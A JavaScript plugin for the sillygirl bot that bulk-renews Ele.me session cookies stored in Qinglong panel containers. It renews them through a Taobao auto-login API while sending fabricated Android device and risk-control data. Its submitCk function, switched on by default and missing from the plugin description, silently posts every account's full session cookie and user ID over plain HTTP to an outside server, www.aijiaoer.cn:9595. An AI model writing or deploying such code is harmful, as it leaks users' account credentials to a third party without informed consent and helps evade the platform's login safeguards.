// [title: 饿了么续期]
// [name: eLeMeXuQi]
// [desc: 批量检测青龙 elmck，调用饿了么自动登录续期并回写、启停变量]
// [author: chuan]
// [version: v3.2.3]
// [rule: ^饿了么续期$]
// [status: true]
// [admin: true]
// [public: true]
// [priority: 9999]
// [class: 工具]
// [icon: https://cdn.jsdelivr.net/npm/@tabler/icons@latest/icons/puzzle.svg]
// [origin: backup/饿了么续期_v3.2.3_By.chuan.py]
// [depe: []]

const { sender: s, container, plugin, Bucket } = require("sillygirl"),
  crypto = require("node:crypto");
const syncBucket = new Bucket("chuan_elm_accountId");
const form = new plugin.Form({
  qinglong_ids: plugin.Form.string().title("青龙容器编号，逗号分隔").default("1"),
  env_names: plugin.Form.string().title("CK变量名，逗号分隔").default("elmck"),
  force_renew: plugin.Form.boolean().title("强制续期").default(false),
  wx_uid: plugin.Form.string().title("WxPusher UID").default(""),
  wx_app_token: plugin.Form.string().title("WxPusher appToken").default(""),
  submit_ck: plugin.Form.boolean().title("同步我不饿服务").default(true),
  timeout_ms: plugin.Form.integer().title("接口超时毫秒").min(3000).max(120000).default(15000),
});
let cfg = {};
const NEED = ["cookie2", "unb", "USERID", "SID", "token", "utdid", "deviceId", "umt"],
  H5 = [...NEED, "_m_h5_tk", "_m_h5_tk_enc"];
function parseCookie(raw) {
  const out = {};
  for (const part of String(raw || "").split(";")) {
    const cut = part.indexOf("=");
    if (cut > 0) {
      const key = part.slice(0, cut).trim();
      if (H5.includes(key)) out[key] = part.slice(cut + 1).trim();
    }
  }
  return out;
}
function cookieString(c, h5 = true) {
  return (
    (h5 ? H5 : NEED)
      .filter((k) => c[k])
      .map((k) => `${k}=${c[k]}`)
      .join(";") + ";"
  );
}
function md5(v) {
  return crypto.createHash("md5").update(v).digest("hex");
}
function deep(obj, key) {
  if (!obj || typeof obj !== "object") return;
  if (Object.prototype.hasOwnProperty.call(obj, key)) return obj[key];
  for (const value of Object.values(obj)) {
    const found = deep(value, key);
    if (found !== undefined) return found;
  }
}
async function request(url, options = {}) {
  const controller = new AbortController(),
    timer = setTimeout(() => controller.abort(), cfg.timeout_ms);
  try {
    const response = await fetch(url, {
        method: options.method || "GET",
        headers: options.headers,
        body: options.body,
        signal: controller.signal,
      }),
      text = await response.text();
    if (response.status >= 400) throw new Error(`HTTP ${response.status}: ${text.slice(0, 160)}`);
    return { response, text };
  } finally {
    clearTimeout(timer);
  }
}
class Elm {
  constructor(raw) {
    this.cookie = parseCookie(raw);
    this.latitude = "30.040553114149304";
    this.longitude = "103.83792941623264";
  }
  sign(t, data) {
    const raw = typeof data === "string" ? data : JSON.stringify(data),
      tk = (this.cookie._m_h5_tk || "a3690260a21965847b0a27348bd9c426").split("_")[0];
    return md5(`${tk}&${t}&12574478&${raw}`);
  }
  async call(host, api, data, v = "1.0", retry = 0) {
    const raw = typeof data === "string" ? data : JSON.stringify(data),
      t = Math.floor(Date.now() / 1000),
      url = new URL(`https://${host}/h5/${api}/${v}/`);
    Object.entries({
      jsv: "2.7.0",
      appKey: "12574478",
      t,
      sign: this.sign(t, raw),
      api,
      v,
      ecode: "1",
      type: "json",
      valueType: "string",
      needLogin: "true",
      LoginRequest: "true",
      dataType: "jsonp",
      ttid: "1601274962374@eleme_android_11.12.88",
    }).forEach(([k, x]) => url.searchParams.set(k, x));
    try {
      const result = await request(url, {
        method: "POST",
        headers: {
          accept: "application/json",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
          "content-type": "application/x-www-form-urlencoded",
          origin: "https://tb.ele.me",
          referer: "https://tb.ele.me/",
          cookie: cookieString(this.cookie),
        },
        body: new URLSearchParams({ data: raw }).toString(),
      });
      let set =
        typeof result.response.headers.getSetCookie === "function"
          ? result.response.headers.getSetCookie()
          : [result.response.headers.get("set-cookie")].filter(Boolean);
      for (const row of set) Object.assign(this.cookie, parseCookie(row));
      return JSON.parse(result.text);
    } catch (error) {
      if (retry < 3) {
        await new Promise((r) => setTimeout(r, 3000));
        return this.call(host, api, data, v, retry + 1);
      }
      throw error;
    }
  }
  async valid() {
    const r = await this.call("waimai-guide.ele.me", "mtop.alsc.personal.queryminecenter", {
      sceneCode: "H5_ELEME_PERSONAL_CENTER",
      sourceFrom: "H5",
      latitude: this.latitude,
      longitude: this.longitude,
      cityId: "",
    });
    return deep(r, "userName") !== "立即登录";
  }
  async renew() {
    const missing = NEED.filter((k) => !this.cookie[k]);
    if (missing.length) return `缺少参数${missing.join(",")}`;
    const ts = Math.floor(Date.now() / 1000),
      data = {
        ext: '{"apiReferer":"{\\"eventName\\":\\"SESSION_INVALID\\"}"}',
        userId: this.cookie.USERID,
        tokenInfo: JSON.stringify({
          appName: "24895413",
          appVersion: "android_11.1.38",
          deviceId: this.cookie.deviceId,
          deviceName: "Android(AOSP on blueline)",
          locale: "zh_CN",
          sdkVersion: "android_5.3.3.4",
          site: 25,
          t: ts,
          token: this.cookie.token,
          ttid: "1608030065155@eleme_android_11.1.38",
          useAcitonType: true,
          useDeviceToken: false,
          utdid: "",
        }),
        riskControlInfo: JSON.stringify({
          appStore: "1608030065155@eleme_android_11.1.38",
          deviceBrand: "Google",
          deviceModel: "AOSP on blueline",
          deviceName: "AOSP on blueline",
          osName: "android",
          osVersion: "10",
          screenSize: "0x0",
          t: ts,
          umidToken: this.cookie.umt,
          wua: "",
        }),
      },
      r = await this.call("guide-acs.m.taobao.com", "com.taobao.mtop.mloginunitservice.autologin", data),
      d = r?.data || {};
    if (Number(d.code) === 3000) {
      let value = d.returnValue?.data;
      try {
        if (typeof value === "string") value = JSON.parse(value);
      } catch (_) {}
      for (const row of value?.cookies || []) {
        const found = String(row).match(/(?:^|;)cookie2=([^;]+)/);
        if (found) this.cookie.cookie2 = found[1];
      }
      const expires = value?.expires
        ? new Date(Number(value.expires) * 1000).toLocaleString("zh-CN", { hour12: false })
        : "未知";
      return `✅续期成功,有效期:${expires}`;
    }
    return d.message || deep(r, "message") || "续期失败";
  }
}
function rowsOf(v) {
  if (Array.isArray(v)) return v;
  if (Array.isArray(v?.data)) return v.data;
  if (Array.isArray(v?.data?.data)) return v.data.data;
  return [];
}
async function enable(ql, id, on) {
  if (on && typeof ql.enableEnvs === "function") return ql.enableEnvs([id]);
  if (!on && typeof ql.disableEnvs === "function") return ql.disableEnvs([id]);
  return ql.request("PUT", `/envs/${on ? "enable" : "disable"}`, [id]);
}
async function update(ql, row, value) {
  const id = row.id || row._id,
    payload = { id, name: row.name, value, remarks: row.remarks || row.remark || "" };
  if (typeof ql.updateEnv === "function") return ql.updateEnv(payload);
  return ql.request("PUT", "/envs", payload);
}
async function submitCk(user, ck) {
  if (!cfg.submit_ck) return;
  try {
    await request("http://www.aijiaoer.cn:9595/api/submit", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ user, type: "elm", cookie: ck, tag: "true" }),
    });
  } catch (_) {}
}
async function wxpush(rows) {
  if (!cfg.wx_uid || !cfg.wx_app_token) return;
  for (let start = 0; start < rows.length; start += 80) {
    const part = rows.slice(start, start + 80),
      html = `<table><tr><th>🆔</th><th>用户ID</th><th>续期结果</th><th>容器</th></tr>${part.map((x) => `<tr><td>${x.index}</td><td>${x.user || ""}</td><td>${x.result}</td><td>${x.container}</td></tr>`).join("")}</table>`;
    await request("https://wxpusher.zjiecode.com/api/send/message", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({
        appToken: cfg.wx_app_token,
        content: html,
        contentType: 3,
        topicIds: [],
        summary: "elm续期推送",
        uids: [cfg.wx_uid],
      }),
    });
  }
}
async function main() {
  try {
    cfg = (await form.get()) || {};
    cfg.timeout_ms = Math.max(3000, Number(cfg.timeout_ms) || 15000);
    let total = 0,
      success = 0,
      valid = 0,
      failed = 0;
    const details = [];
    for (const id of String(cfg.qinglong_ids || "1")
      .split(/[,，]/)
      .map((x) => Number(x.trim()))
      .filter(Number.isFinite)) {
      const ql = new container.QingLong({ id });
      for (const name of String(cfg.env_names || "elmck")
        .split(/[,，]/)
        .map((x) => x.trim())
        .filter(Boolean)) {
        const envs = rowsOf(await ql.getEnvs({ searchValue: name })).filter((x) => x.name === name);
        for (let i = 0; i < envs.length; i++) {
          const row = envs[i],
            envId = row.id || row._id,
            user = new Elm(row.value);
          total++;
          let result;
          try {
            await user.renew();
            if (cfg.force_renew) {
              result = await user.renew();
            } else if (await user.valid()) {
              result = "原账号有效";
              valid++;
            } else result = await user.renew();
            if (String(result).includes("续期成功")) {
              success++;
              const value = cookieString(user.cookie, false);
              await update(ql, row, value);
              await enable(ql, envId, true);
              await submitCk(user.cookie.USERID, value);
              if ((await syncBucket.get(user.cookie.USERID, "")) !== "")
                await syncBucket.set(user.cookie.USERID, value);
            } else if (result === "原账号有效") {
              await enable(ql, envId, true);
              await submitCk(user.cookie.USERID, row.value);
            } else {
              failed++;
              if (/非法的token|登录状态已经失效/.test(String(result))) await enable(ql, envId, false);
            }
          } catch (error) {
            result = error.message;
            failed++;
          }
          details.push({ index: i + 1, user: user.cookie.USERID, result, container: String(id) });
        }
      }
    }
    await wxpush(details);
    const text = `饿了么续期完成：总账号${total}，原账号有效${valid}，续期成功${success}，失败${failed}`;
    return typeof s.pushAdmin === "function" ? s.pushAdmin(text) : s.reply(text);
  } catch (error) {
    return s.reply(`饿了么续期执行失败：${error?.message || error}`);
  }
}
main();
